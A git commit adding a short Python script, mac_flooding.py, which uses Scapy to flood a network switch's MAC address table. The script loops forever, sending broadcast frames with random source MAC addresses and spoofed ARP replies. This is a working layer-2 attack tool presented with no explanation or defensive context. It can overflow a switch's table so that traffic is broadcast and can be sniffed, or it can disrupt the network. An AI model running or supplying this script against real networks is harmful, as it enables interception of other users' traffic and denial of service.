f45129bbe42d16110943ef9e9edc99bcead16c0d
rhlobo <rhlobo+github@gmail.com>
2014-09-21 17:04:18 -0300

    Created script to flood switch mac table randomly.

---
+++ mac_flooding.py
@@ -0,0 +1,18 @@
+#!/usr/bin/env python
+
+
+from scapy.all import *
+
+
+def run():
+    while True:
+        sendp(Ether(src=RandMAC(),
+                    dst="FF:FF:FF:FF:FF:FF") /
+              ARP(op=2,
+                  psrc="0.0.0.0",
+                  hwdst="FF:FF:FF:FF:FF:FF") /
+              Padding(load="X" * 18))
+
+
+if __name__ == '__main__':
+    run()
